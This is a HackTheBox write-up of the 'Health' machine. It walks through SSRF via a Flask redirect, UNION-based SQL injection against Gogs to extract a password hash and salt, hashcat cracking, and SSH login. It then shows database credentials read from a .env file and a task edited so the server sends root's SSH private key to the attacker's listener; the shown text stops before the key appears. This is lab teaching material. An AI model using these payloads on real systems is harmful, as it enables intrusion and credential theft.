# Health - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Health.JPG](images/Health.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `21`, `22`, and `3000`.

***User***: By redirecting the monitoring URL to the internal port `3000`, we discover that it is running `Gogs`. We also find an SQL injection vulnerability in `Gogs`, which allows us to obtain the password and salt for the `susanne` user.

***Root***: Examining the monitoring health `php` code, we see that it has the ability to read local files using `file_get_contents`. We create a new task and modify the monitored URL in the database (the database credentials can be found in `/var/www/html/.env`) to `/root/id_rsa`. This gives us access to the root user's SSH private key.


![pwn.JPG](images/pwn.JPG)


## Health Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ nmap -sV -sC -oA nmap/Health 10.10.11.176
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 23:03 IDT
Nmap scan report for 10.10.11.176
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.jpg)

As we can see, we are required to enter Payload and Monitoring URLs.

During the `nmap` scan, we found that port `3000` is filtered. Let's try accessing it internally.

We are unable to use `localhost` as the Payload/Monitor URL.

However, we can access our host and redirect `localhost`.

We can use the following `python` script to redirect requests to `localhost`:
```python
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ cat redirect.py 
import os
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def red():
    return redirect("http://127.0.0.1:3000", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port='5000')
```

On the Monitoring URL, we need to enter http://10.10.14.14:5000 and on the Payload URL, we need to enter a different URL where we can see the HTTP response from the redirect request to http://127.0.0.1:3000. We can use a `nc` listener as the Payload URL, as shown in the following image:

![urls.JPG](./images/urls.jpg)

Next, let's start the redirect and the `nc` listeners:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ python3 redirect.py 
 * Serving Flask app "redirect" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)

┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ nc -lvp 4444
listening on [any] 4444 ...

```

After clicking the `Test` button, we get the following response:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ python3 redirect.py 
 * Serving Flask app "redirect" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
10.10.11.176 - - [24/Sep/2022 15:45:26] "GET / HTTP/1.0" 302 -

┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from health.htb [10.10.11.176] 37982
POST / HTTP/1.1
Host: 10.10.14.15:4444
Accept: */*
Content-type: application/json
Content-Length: 7688
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.14.15:4444","monitoredUrl":"http:\/\/10.10.14.15:5000","health":"up","body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"RkB-h8FNxr8CbimuJpTLKZ2K73c6MTY2NDAyMzUyNjg0MDc4ODI2MA==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"RkB-h8FNxr8CbimuJpTLKZ2K73c6MTY2NDAyMzUyNjg0MDc4ODI2MA==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>6ms<\/strong> \u00b7\n\t\t            Template: <strong>6ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>","message":"HTTP\/1.0 302 FOUND","headers":{"Content-Type":"text\/html; charset=UTF-8","Content-Length":"249","Location":"http:\/\/127.0.0.1:3000","Server":"Werkzeug\/1.0.0 Python\/3.8.5","Date":"Sat, 24 Sep 2022 12:45:26 GMT","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}

```

By parsing the `body` of the response, we find the following HTML:
```HTML
<!DOCTYPE html>
<html>
	<head data-suburl="">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="author" content="Gogs - Go Git Service" />
		<meta name="description" content="Gogs(Go Git Service) a painless self-hosted Git Service written in Go" />
		<meta name="keywords" content="go, git, self-hosted, gogs">
		<meta name="_csrf" content="RkB-h8FNxr8CbimuJpTLKZ2K73c6MTY2NDAyMzUyNjg0MDc4ODI2MA==" />
		

		<link rel="shortcut icon" href="/img/favicon.png" />

		
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">

		<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
		
		
		<link rel="stylesheet" href="/ng/css/ui.css">
		<link rel="stylesheet" href="/ng/css/gogs.css">
		<link rel="stylesheet" href="/ng/css/tipsy.css">
		<link rel="stylesheet" href="/ng/css/magnific-popup.css">
		<link rel="stylesheet" href="/ng/fonts/octicons.css">
		<link rel="stylesheet" href="/css/github.min.css">

		
    	<script src="/ng/js/lib/lib.js"></script>
    	<script src="/ng/js/lib/jquery.tipsy.js"></script>
    	<script src="/ng/js/lib/jquery.magnific-popup.min.js"></script>
        <script src="/ng/js/utils/tabs.js"></script>
        <script src="/ng/js/utils/preview.js"></script>
		<script src="/ng/js/gogs.js"></script>

		<title>Gogs: Go Git Service</title>
	</head>
	<body>
		<div id="wrapper">
		<noscript>Please enable JavaScript in your browser!</noscript>

<header id="header">
    <ul class="menu menu-line container" id="header-nav">
        

        
            
            <li class="right" id="header-nav-help">
                <a target="_blank" href="http://gogs.io/docs"><i class="octicon octicon-info"></i>&nbsp;&nbsp;Help</a>
            </li>
            <li class="right" id="header-nav-explore">
                <a href="/explore"><i class="octicon octicon-globe"></i>&nbsp;&nbsp;Explore</a>
            </li>
            
        
    </ul>
</header>
<div id="promo-wrapper">
    <div class="container clear">
        <div id="promo-logo" class="left">
            <img src="/img/gogs-lg.png" alt="logo" />
        </div>
        <div id="promo-content">
            <h1>Gogs</h1>
            <h2>A painless self-hosted Git service written in Go</h2>
            <form id="promo-form" action="/user/login" method="post">
                <input type="hidden" name="_csrf" value="RkB-h8FNxr8CbimuJpTLKZ2K73c6MTY2NDAyMzUyNjg0MDc4ODI2MA==">
                <input class="ipt ipt-large" id="username" name="uname" type="text" placeholder="Username or E-mail"/>
                <input class="ipt ipt-large" name="password" type="password" placeholder="Password"/>
                <input name="from" type="hidden" value="home">
                <button class="btn btn-black btn-large">Sign In</button>
                <button class="btn btn-green btn-large" id="register-button">Register</button>
            </form>
            <div id="promo-social" class="social-buttons">
                



            </div>
        </div>&nbsp;
    </div>
</div>
<div id="feature-wrapper">
    <div class="container clear">
        
        <div class="grid-1-2 left">
            <i class="octicon octicon-flame"></i>
            <b>Easy to install</b>
            <p>Simply <a target="_blank" href="http://gogs.io/docs/installation/install_from_binary.html">run the binary</a> for your platform. Or ship Gogs with <a target="_blank" href="https://github.com/gogits/gogs/tree/master/dockerfiles">Docker</a> or <a target="_blank" href="https://github.com/geerlingguy/ansible-vagrant-examples/tree/master/gogs">Vagrant</a>, or get it <a target="_blank" href="http://gogs.io/docs/installation/install_from_packages.html">packaged</a>.</p>
        </div>
        <div class="grid-1-2 left">
            <i class="octicon octicon-device-desktop"></i>
            <b>Cross-platform</b>
            <p>Gogs runs anywhere <a target="_blank" href="http://golang.org/">Go</a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!</p>
        </div>
        <div class="grid-1-2 left">
            <i class="octicon octicon-rocket"></i>
            <b>Lightweight</b>
            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!</p>
        </div>
        <div class="grid-1-2 left">
            <i class="octicon octicon-code"></i>
            <b>Open Source</b>
            <p>It's all on <a target="_blank" href="https://github.com/gogits/gogs/">GitHub</a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!</p>
        </div>
        
    </div>
</div>
		</div>
		<footer id="footer">
		    <div class="container clear">
		        <p class="left" id="footer-rights">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>6ms</strong> \u00b7
		            Template: <strong>6ms</strong></p>

		        <div class="right" id="footer-links">
		            <a target="_blank" href="https://github.com/gogits/gogs"><i class="fa fa-github-square"></i></a>
		            <a target="_blank" href="https://twitter.com/gogitservice"><i class="fa fa-twitter"></i></a>
		            <a target="_blank" href="https://plus.google.com/communities/115599856376145964459"><i class="fa fa-google-plus"></i></a>
		            <a target="_blank" href="http://weibo.com/gogschina"><i class="fa fa-weibo"></i></a>
		            <div id="footer-lang" class="inline drop drop-top">Language
		                <div class="drop-down">
		                    <ul class="menu menu-vertical switching-list">
		                    	
		                        <li><a href="#">English</a></li>
		                        
		                        <li><a href="/?lang=zh-CN">\u7b80\u4f53\u4e2d\u6587</a></li>
		                        
		                        <li><a href="/?lang=zh-HK">\u7e41\u9ad4\u4e2d\u6587</a></li>
		                        
		                        <li><a href="/?lang=de-DE">Deutsch</a></li>
		                        
		                        <li><a href="/?lang=fr-CA">Fran\u00e7ais</a></li>
		                        
		                        <li><a href="/?lang=nl-NL">Nederlands</a></li>
		                        
		                    </ul>
		                </div>
		            </div>
		            <a target="_blank" href="http://gogs.io">Website</a>
		            <span class="version">Go1.3.2</span>
		        </div>
		    </div>
		</footer>
	</body>
</html>
```

This corresponds to the following page::

![body.JPG](images/body.JPG)

We can see this is [Gogs](https://gogs.io/)

We found the following vulnerabilities in `Gogs`:
1. [https://www.exploit-db.com/exploits/35238](https://www.exploit-db.com/exploits/35238)
2. [https://www.exploit-db.com/exploits/35237](https://www.exploit-db.com/exploits/35237)

Based on these vulnerabilities, we can redirect the request to the following URL:```http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--``` by using the same script above.

After running it again, we get the following response:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ nc -lvp 4444 
connect to [10.10.14.15] from health.htb [10.10.11.176] 40862
POST / HTTP/1.1
Host: 10.10.14.15:4444
Accept: */*
Content-type: application/json
Content-Length: 838

{"webhookUrl":"http:\/\/10.10.14.15:4444","monitoredUrl":"http:\/\/10.10.14.15:5000","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 302 FOUND","headers":{"Content-Type":"application\/json; charset=UTF-8","Content-Length":"264","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/passwd\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Server":"Werkzeug\/1.0.0 Python\/3.8.5","Date":"Sat, 24 Sep 2022 13:03:22 GMT","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```

By parsing the `body`, we obtain the following JSON:
```json
[{"username":"susanne","avatar":"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce"},{"username":"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37","avatar":"\/\/1.gravatar.com\/avatar\/1"}],"ok":true}
```

According this [Gogs Github issue](https://github.com/gogs/gogs/issues/1734) we know that the password also contains a salt. We can extract the salt by changing the URL to ```http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--```

After running it again, we get the following parsed JSON:
```json
{"webhookUrl":"http:\/\/10.10.14.15:4444","monitoredUrl":"http:\/\/10.10.14.15:5000","health":"up","body":"{"data":[{"username":"susanne","avatar":"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce"},{"username":"sO3XIbeW14","avatar":"\/\/1.gravatar.com\/avatar\/1"}],"ok":true}","message":"HTTP\/1.0 302 FOUND","headers":{"Content-Type":"application\/json; charset=UTF-8","Content-Length":"174","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/salt\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Server":"Werkzeug\/1.0.0 Python\/3.8.5","Date":"Sat, 24 Sep 2022 13:12:05 GMT","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```

The salt is ```sO3XIbeW14``` and the password in SHA256 is ```66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37``` and the user name is ```susanne```.

We can use `hashcat` to crack the password:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ echo 'sha256:10000:'$(echo 'sO3XIbeW14' | base64 | cut -c1-14)':'$(echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64) > hash
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ cat hash
cat hash
sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ hashcat -m 10900 hash ~/Desktop/rockyou.txt
...
```

We successfully obtain the password `february15`.

We can now use this password to log in via SSH:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ ssh susanne@health.htb
The authenticity of host 'health.htb (10.10.11.176)' can't be established.
ECDSA key fingerprint is SHA256:PehYtyDYI8W9KIo30/2Qd0Fx1h49oC96C9a7Dr5cISQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'health.htb,10.10.11.176' (ECDSA) to the list of known hosts.
susanne@health.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 24 13:22:30 UTC 2022

  System load:  0.0               Processes:           174
  Usage of /:   66.3% of 3.84GB   Users logged in:     0
  Memory usage: 11%               IP address for eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.


susanne@health:~$ cat user.txt
4f9b744567ef6adceba68ae2e356df5a
```

And we get the user flag ```4f9b744567ef6adceba68ae2e356df5a```.

### Root

Using `pspy`, we see the following processes running:
```console
susanne@health:/tmp$ ./pspy64 
...
2022/09/24 13:26:02 CMD: UID=0    PID=3327   | grep columns 
2022/09/24 13:26:02 CMD: UID=0    PID=3326   | stty -a 
2022/09/24 13:26:06 CMD: UID=0    PID=3328   | mysql laravel --execute TRUNCATE tasks 
2022/09/24 13:27:01 CMD: UID=0    PID=3333   | sleep 5 
2022/09/24 13:27:01 CMD: UID=0    PID=3332   | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2022/09/24 13:27:01 CMD: UID=0    PID=3331   | /bin/bash -c sleep 5 && /root/meta/clean.sh 
2022/09/24 13:27:01 CMD: UID=0    PID=3330   | /usr/sbin/CRON -f 
2022/09/24 13:27:01 CMD: UID=0    PID=3329   | /usr/sbin/CRON -f 
....
```

We notice that `mysql` and `php` tasks are being run by `root`..

Now, let's examine the Health Checker logic in the following file: 
```php
susanne@health:/var/www/html/app/Http/Controllers$ cat HealthChecker.php 
<?php

namespace App\Http\Controllers;

class HealthChecker
{
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
        if ($res) {

            if ($onlyError) {
                return $json;
            }

            $json['health'] = "up";
	    $json['body'] = $res;
	    if (isset($http_response_header)) {
            $headers = [];
            $json['message'] = $http_response_header[0];

            for ($i = 0; $i <= count($http_response_header) - 1; $i++) {

                $split = explode(':', $http_response_header[$i], 2);

                if (count($split) == 2) {
                    $headers[trim($split[0])] = trim($split[1]);
                } else {
                    error_log("invalid header pair: $http_response_header[$i]\n");
                }

            }

	    $json['headers'] = $headers;
	    }

        } else {
            $json['health'] = "down";
        }

        $content = json_encode($json);

        // send
        $curl = curl_init($webhookUrl);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER,
            array("Content-type: application/json"));
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
        curl_exec($curl);
        curl_close($curl);

        return $json;

    }
}
```

We see that the function `file_get_contents` is being used to read the contents of a requested file.

If we create a new monitoring task, it will be registered in the database. We can find the database credentials in the file `/var/www/html/.env`:
```console
susanne@health:/var/www/html$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:x12LE6h+TU6x4gNKZIyBOmthalsPLPLv/Bf/MJfGbzY=
APP_DEBUG=true
APP_URL=http://localhost

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+

```

Now, let's connect to the database:
```console
susanne@health:/var/www/html$ mysql -Dlaravel -ularavel -pMYsql_strongestpass@2014+
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 164
Server version: 5.7.39-0ubuntu0.18.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
6 rows in set (0.00 sec)
```

We can see the `tasks` table, and if we create a new task, it will appear in the table:
```console
mysql> select * from tasks;
+--------------------------------------+-------------------------+-----------+-------------------------+-----------+---------------------+---------------------+
| id                                   | webhookUrl              | onlyError | monitoredUrl            | frequency | created_at          | updated_at          |
+--------------------------------------+-------------------------+-----------+-------------------------+-----------+---------------------+---------------------+
| 29676d8d-7d14-4bbf-8deb-3068c323a312 | http://10.10.14.15:4444 |         0 | http://10.10.14.15:5000 | * * * * * | 2022-09-24 13:39:55 | 2022-09-24 13:39:55 |
+--------------------------------------+-------------------------+-----------+-------------------------+-----------+---------------------+---------------------+

```

To read files, we need to change the `monitoredUrl` to the path of the file we want to read, such as the `id_rsa` file of the `root` user:
```console
mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from tasks;
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+
| id                                   | webhookUrl              | onlyError | monitoredUrl             | frequency | created_at          | updated_at          |
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+
| c78d88c5-00a4-4dcd-a99d-217dd1db5927 | http://10.10.14.15:4444 |         0 | file:///root/.ssh/id_rsa | * * * * * | 2022-09-24 13:42:45 | 2022-09-24 13:42:45 |
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+
1 row in set (0.00 sec)

```

We need to wait a few seconds before we can obtain the SSH private key of the `root` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from health.htb [10.10.11.176] 46830
POST / HTTP/1.1
Host: 10.10.14.15:4444
Accept: */*
Content-type: application/json
Content-Length: 1832
Expect: 100-continue

